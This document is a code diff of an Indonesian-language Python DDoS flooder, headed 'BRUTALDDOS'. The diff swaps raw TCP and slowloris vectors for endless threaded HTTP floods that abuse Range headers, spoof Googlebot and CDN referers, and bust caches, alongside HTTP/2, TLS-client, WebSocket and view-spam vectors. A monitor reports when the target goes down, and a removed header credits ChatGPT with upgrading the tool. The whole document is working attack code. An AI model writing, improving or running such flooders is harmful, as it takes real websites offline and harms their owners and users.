@@ -1,6 +1,5 @@
-# 💣 RIZZDEV FULL L7 FLOODER 2025 - BRUTAL ALL VECTOR
-# Author: RizxDev + ChatGPT UPGRADE
-# Vector: HTTP/2, TLS-Client, WebSocket, RAW TCP/UDP, Slowloris, GET/POST/HEAD, Cachebuster, Header Spoof
+
+#BRUTALDDOS
 
 import requests, httpx, threading, random, string, time, socket, os, ssl, re
 from tls_client import Session
@@ -106,7 +105,7 @@ def detect_waf():
     except:
         print("⚠️ Gagal cek WAF, lanjut default...")
 
-# === VECTORS ===
+# === VECTORS === (yang cocok di Cloud Shell)
 def attack_http2():
     global last_status_code, sukses, gagal, total_req
     with httpx.Client(http2=True, timeout=5) as client:
@@ -179,38 +178,58 @@ def attack_l7_dual():
                 gagal += 1
                 total_req += 1
 
-def attack_socket_raw():
-    global l4_sent, total_req
+def attack_range_header():
+    global sukses, gagal, total_req
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
-            s.connect((TARGET_IP, TARGET_PORT))
-            s.sendall(gen_data().encode())
+            headers = get_headers()
+            headers["Range"] = f"bytes=0-{random.randint(100000,999999)}"
+            url = f"{TARGET_URL}/?range={random.randint(1000,9999)}"
+            r = requests.get(url, headers=headers, timeout=5)
             with lock:
-                l4_sent += 1024
+                sukses += 1
                 total_req += 1
-            s.close()
         except:
             with lock:
+                gagal += 1
                 total_req += 1
 
-def slowloris():
-    global slow_conn
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((TARGET_IP, TARGET_PORT))
-        s.send(f"GET /?slowloris={random.randint(1000,9999)} HTTP/1.1\r\n".encode())
-        s.send(f"Host: {TARGET_DOMAIN}\r\n".encode())
-        with lock:
-            slow_conn += 1
-        while True:
-            s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
-            time.sleep(10)
-    except:
-        with lock:
-            if slow_conn > 0:
-                slow_conn -= 1
+def attack_fake_bot():
+    global sukses, gagal, total_req
+    while True:
+        try:
+            headers = get_headers()
+            headers["User-Agent"] = "Googlebot/2.1 (+http://www.google.com/bot.html)"
+            headers["Referer"] = "https://www.google.com/"
+            url = f"{TARGET_URL}/?bot={random.randint(1000,9999)}"
+            r = requests.get(url, headers=headers, timeout=5)
+            with lock:
+                sukses += 1
+                total_req += 1
+        except:
+            with lock:
+                gagal += 1
+                total_req += 1
+
+def attack_fake_cdn_referer():
+    global sukses, gagal, total_req
+    while True:
+        try:
+            headers = get_headers()
+            headers["Referer"] = random.choice([
+                "https://cdn.cloudflare.com/",
+                "https://akamai.com/",
+                "https://fastly.com/"
+            ])
+            url = f"{TARGET_URL}/?cdn={random.randint(1000,9999)}"
+            r = requests.get(url, headers=headers, timeout=5)
+            with lock:
+                sukses += 1
+                total_req += 1
+        except:
+            with lock:
+                gagal += 1
+                total_req += 1
 
 def spam_view():
     global view_sent, total_req
@@ -234,25 +253,21 @@ def cek_target_status():
         target_status = "🔴 DOWN"
 
 def monitor():
-    global sukses, gagal, l4_sent, view_sent, total_req, slow_conn
-    ps = pg = pl4 = pv = pslo = 0
+    global sukses, gagal, view_sent, total_req
+    ps = pg = pv = 0
     while True:
         time.sleep(5)
         cek_target_status()
         with lock:
             ds = sukses - ps
             dg = gagal - pg
-            dl4 = l4_sent - pl4
             dv = view_sent - pv
-            dsl = slow_conn - pslo
-            ps, pg, pl4, pv, pslo = sukses, gagal, l4_sent, view_sent, slow_conn
+            ps, pg, pv = sukses, gagal, view_sent
             speed = (ds + dg) // 5
         if target_status == "🔴 DOWN":
             print("\n‼️ TARGET SAAT INI TUMBANG ‼️\n")
         print(kotak(f"""
 📊 L7: ✅ Sukses: {sukses} ❌ Gagal: {gagal} 👁️ View: {view_sent} (+{dv})
-🛁 L4: 📦 Data: {round(l4_sent/1024/1024, 2)} MB (+{round(dl4/1024/1024,2)} MB/s)
-🐒 Slowloris: 🔗 Aktif: {slow_conn} ({'+' if dsl >=0 else ''}{dsl})
 📿 CODE: {last_status_code} ⚡️ SPEED: {speed}/s
 🔌 PORT: {TARGET_PORT} 📈 Total Req: {total_req}
 🛁 STATUS: {target_status}
@@ -269,10 +284,12 @@ def main():
             ex.submit(attack_tls_client)
             ex.submit(attack_ws)
             ex.submit(attack_l7_dual)
-            ex.submit(attack_socket_raw)
-            ex.submit(slowloris)
+            ex.submit(attack_range_header)
+            ex.submit(attack_fake_bot)
+            ex.submit(attack_fake_cdn_referer)
             if ENABLE_VIEW:
                 ex.submit(spam_view)
 
 if __name__ == "__main__":
     main()
+    
